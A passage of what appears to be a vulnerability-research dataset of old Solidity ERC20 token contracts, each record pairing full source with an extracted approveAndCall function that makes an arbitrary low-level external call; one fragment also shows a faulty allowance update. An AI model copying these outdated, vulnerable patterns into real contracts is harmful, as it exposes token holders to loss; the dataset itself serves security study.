>= _value);\n }\n allowed[_from][msg.sender] = allowed[_from][_to].sub(_value);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function lockedBalanceOf(\n address _owner\n )\n constant\n returns (uint)\n {\n return lockedBalances[_owner];\n }\n function enableTransfers()\n onlyOwner\n external\n returns (bool)\n {\n isTransferable = true;\n return isTransferable;\n }\n function addTransferrer(\n address _transferrer\n )\n public\n onlyOwner\n {\n transferrers[_transferrer] = true;\n }\n function releaseBonus()\n public\n onlyOwner\n {\n isBonusLocked = false;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b4"
  },
  "filename": "32467.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20ReelToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20ReelToken(\n ) {\n balances[msg.sender] = 1000;\n totalSupply = 1000;\n name = \"Reeliant Coin\";\n decimals = 0;\n symbol = \"REEL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b5"
  },
  "filename": "32484.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Vaponymous is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Vaponymous(\n ) {\n balances[msg.sender] = 6200000000000000;\n totalSupply = 6200000000000000;\n name = \"Vaponymous\";\n decimals = 8;\n symbol = \"VAPO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b6"
  },
  "filename": "32486.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14b7"
  },
  "filename": "32549.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract VeroFox is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function VeroFox(\n ) {\n balances[msg.sender] = 1500000000000000;\n totalSupply = 1500000000000000;\n name = \"VeroFox\";\n decimals = 8;\n symbol = \"VFX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14b8"
  },
  "filename": "32572.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Bizacoin\";\n decimals = 0;\n symbol = \"Bizc\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14b9"
  },
  "filename": "32611.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract OrientalChainToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function OrientalChainToken(\n ) {\n balances[msg.sender] = 860000000000000;\n totalSupply = 860000000000000;\n name = \"Oriental Chain\";\n decimals = 6;\n symbol = \"OC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ba"
  },
  "filename": "32622.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract YAYTOKEN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function YAYTOKEN(\n ) {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"YAY TOKEN\";\n decimals = 2;\n symbol = \"YAY\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14bb"
  },
  "filename": "32623.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Inventify is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is Inventify {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 120000000000000000000;\n totalSupply = 120000000000000000000;\n name = \"INVENTIFY\";\n decimals = 12;\n symbol = \"NVT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14bc"
  },
  "filename": "32624.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract YuCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function YuCoin(\n ) {\n balances[msg.sender] = 21000000;\n totalSupply = 21000000;\n name = \"YuCoin\";\n decimals = 0;\n symbol = \"WOO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14bd"
  },
  "filename": "32658.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EIDOO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EIDOO(\n ) {\n balances[msg.sender] = 810000000;\n totalSupply = 810000000;\n name = \"EIDOO\";\n decimals = 1;\n symbol = \"EDO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14be"
  },
  "filename": "32659.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BJAHCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BJAHCoin () {\n balances[msg.sender] = 6969696969696969;\n totalSupply = 6969696969696969;\n name = \"Blackjack and Hookers Coin\";\n decimals = 9;\n symbol = \"BJAH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14bf"
  },
  "filename": "32662.sol",
